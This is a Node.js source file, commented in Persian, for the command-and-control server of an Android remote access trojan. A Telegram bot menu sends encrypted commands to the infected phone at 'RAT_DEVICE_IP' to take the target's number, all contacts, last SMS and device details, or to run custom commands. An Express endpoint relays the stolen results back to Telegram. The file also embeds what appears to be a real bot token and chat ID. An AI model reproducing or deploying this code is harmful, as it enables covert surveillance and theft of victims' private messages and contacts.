const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const app = express();
const port = 3000;

// تنظیمات بات تلگرام
const TOKEN = '7883590739:AAEF6vbngZGD8bgMP2mOAmIXIzAgDK2ICe0'; // توکن بات تلگرام خود را وارد کنید
const CHAT_ID = '7208236708'; // Chat ID خود را وارد کنید
const bot = new TelegramBot(TOKEN, { polling: true });

// کلید رمزنگاری
const ENCRYPTION_KEY = 'your-32-byte-encryption-key-here'; // باید 32 بایت باشد
const IV = 'your-16-byte-iv-here'; // باید 16 بایت باشد

// رمزنگاری داده‌ها
function encrypt(text) {
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), IV);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

// رمزگشایی داده‌ها
function decrypt(encrypted) {
    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), IV);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

// تنظیمات Express
app.use(express.json());

// API برای دریافت پاسخ از رت
app.post('/response', (req, res) => {
    const { encryptedData } = req.body;
    try {
        const decrypted = decrypt(encryptedData);
        const data = JSON.parse(decrypted);
        bot.sendMessage(CHAT_ID, `Response: ${JSON.stringify(data.result)}`);
        res.json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// ایجاد دکمه‌های بات تلگرام
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== CHAT_ID) {
        bot.sendMessage(chatId, 'Unauthorized access.');
        return;
    }
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Target Number', callback_data: 'get_number' }],
                [{ text: 'Get All Target Contact', callback_data: 'get_contacts' }],
                [{ text: 'Get Last SMS Target', callback_data: 'get_sms' }],
                [{ text: 'Get Device Info Full', callback_data: 'get_device_info' }],
                [{ text: 'Run Custom Command', callback_data: 'custom_command' }]
            ]
        }
    };
    bot.sendMessage(chatId, 'Choose an action:', opts);
});

// مدیریت دستورات بات
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (chatId.toString() !== CHAT_ID) {
        bot.sendMessage(chatId, 'Unauthorized access.');
        return;
    }
    const command = query.data;
    const payload = { command, chatId };
    try {
        // ارسال دستور به اپلیکیشن اندرویدی (رت)
        const response = await fetch('http://RAT_DEVICE_IP:8080/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ encryptedData: encrypt(JSON.stringify(payload)) })
        });
        if (response.ok) {
            bot.sendMessage(chatId, `Command ${command} sent successfully.`);
        } else {
            bot.sendMessage(chatId, 'Failed to send command.');
        }
    } catch (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
    }
    bot.answerCallbackQuery(query.id);
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
